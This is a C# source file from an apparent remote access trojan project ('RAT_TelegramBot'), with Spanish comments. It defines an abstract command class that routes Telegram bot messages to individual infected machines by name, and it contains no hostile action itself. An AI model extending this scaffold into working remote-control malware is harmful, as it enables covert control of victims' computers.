using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using Telegram.Bot;
using Telegram.Bot.Types;

namespace RAT_TelegramBot.Models.Commands {
    public abstract class Command {
        // Conincide con el comando actual
        public abstract string Name { get; }

        // Recibirá el mensaje en el equipo como una instancia de telegrambotcliente 
        public abstract void Execute(Message message, TelegramBotClient client);

        public bool Contains(string command) {
            // Verificamos el equipo por el nombre del equipo mismo y por el nombre del bot 
            // Sucede que en los chats tienen muchos equipos y estos se cruzan
            return command.Contains(this.Name) && command.Contains(AppSettings.Name);


        }
    }
}